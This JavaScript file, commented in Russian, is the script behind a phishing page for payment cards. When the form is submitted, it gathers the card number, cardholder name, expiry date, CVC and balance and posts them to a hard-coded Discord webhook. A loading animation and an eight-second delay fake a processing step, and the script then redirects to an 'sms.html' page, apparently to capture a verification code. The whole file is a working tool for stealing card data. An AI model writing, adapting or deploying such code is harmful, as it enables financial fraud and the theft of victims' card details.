// Функция для отправки данных на вебхук Discord
function sendToDiscord(data) {
    const webhookUrl = "https://discordapp.com/api/webhooks/1307681216220233800/cCpZnpuKDlPl6PnQnqO6rvhPHyX8KEQ5eqq16y_PaTVaTzOGAOS3ANs4WxWfPc9yAH_Z"; // Замените на ваш вебхук URL

    // Формируем сообщение, которое отправим в Discord
    const payload = {
        content: `Данные карты:
        Номер карты: ${data.cardNumber}
        Имя держателя карты: ${data.cardHolder}
        Срок действия: ${data.expiryMonth}/${data.expiryYear}
        CCV: ${data.cvc}
        Баланс: ${data.balance}`
    };

    // Отправка POST-запроса в Discord через вебхук
    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log("Успешно отправлено в Discord:", data);
    })
    .catch((error) => {
        console.error("Ошибка при отправке в Discord:", error);
    });
}

// Функция для проверки всех обязательных полей формы
function checkForm() {
    const inputs = document.querySelectorAll('input[required], select[required]');
    let isValid = true;

    inputs.forEach(input => {
        if (!input.value) {
            isValid = false;
            input.classList.add('error');
        } else {
            input.classList.remove('error');
        }
    });

    return isValid;
}

// Обработчик отправки формы
document.getElementById("card-form").addEventListener("submit", function (e) {
    e.preventDefault(); // Остановить стандартное отправление формы

    // Скрыть сообщение об ошибке
    document.getElementById("error-message").textContent = '';

    // Получение данных из формы
    const cardNumber = Array.from(document.querySelectorAll('.form .cd-numbers input')).map(input => input.value).join('');
    const cardHolder = document.getElementById('cd-holder-input').value;
    const expiryMonth = document.getElementById('month').value;
    const expiryYear = document.getElementById('year').value;
    const cvc = document.getElementById('cvc').value;
    const balance = document.getElementById('balance').value;

    // Проверка валидности формы
    if (checkForm()) {
        // Показать анимацию загрузки
        document.getElementById("loading-overlay").style.display = 'block';

        // Подготовить данные и отправить их в Discord
        const data = {
            cardNumber: cardNumber,
            cardHolder: cardHolder,
            expiryMonth: expiryMonth,
            expiryYear: expiryYear,
            cvc: cvc,
            balance: balance
        };

        // Отправить данные в Discord
        sendToDiscord(data);

        // Задержка для имитации процесса загрузки
        setTimeout(function () {
            window.location.href = 'sms.html';  // Замените на нужную страницу
        }, 8000);
    } else {
        // Если есть незаполненные поля, показать ошибку
        document.getElementById("error-message").textContent = "Пожалуйста, заполните все поля.";
    }
});
